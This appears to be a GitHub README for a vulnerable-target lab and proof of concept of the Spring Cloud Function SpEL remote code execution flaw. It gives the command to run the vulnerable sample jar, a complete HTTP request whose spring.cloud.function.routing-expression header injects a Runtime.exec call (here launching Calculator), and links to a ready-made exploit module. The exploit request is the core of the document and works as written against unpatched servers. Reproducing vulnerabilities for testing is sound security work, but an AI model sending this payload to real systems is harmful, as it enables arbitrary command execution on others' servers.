# spring-cloud-function SpEL RCE

## Vultarget

You can build it for youself. [here is the source of the Vuln App](./src)

Or you can use [the release which built by cckuailong(Yh,it's me)](https://github.com/cckuailong/spring-cloud-function-SpEL-RCE/releases/tag/untagged-e1c4060d01bbb4ddc6cf)

```
java -jar function-sample-pojo-3.2.1.RELEASE.jar
```

P.S. test with Java17

## Poc

```
POST /xxx HTTP/1.1
Host: test.com:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator")
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

xxx
```

## Result

RCE！！

![demo](./img/demo.png)

Enjoy it!

I put the poc code in the repo:

https://github.com/cckuailong/pocsploit

https://github.com/cckuailong/pocsploit/blob/master/modules/vulnerabilities/springcloud/springcloud-function-spel-rce.py

![demo2](./img/demo2.png)

[Article](https://mp.weixin.qq.com/s/AVvyKjRz_XooIB0s1S8njA)

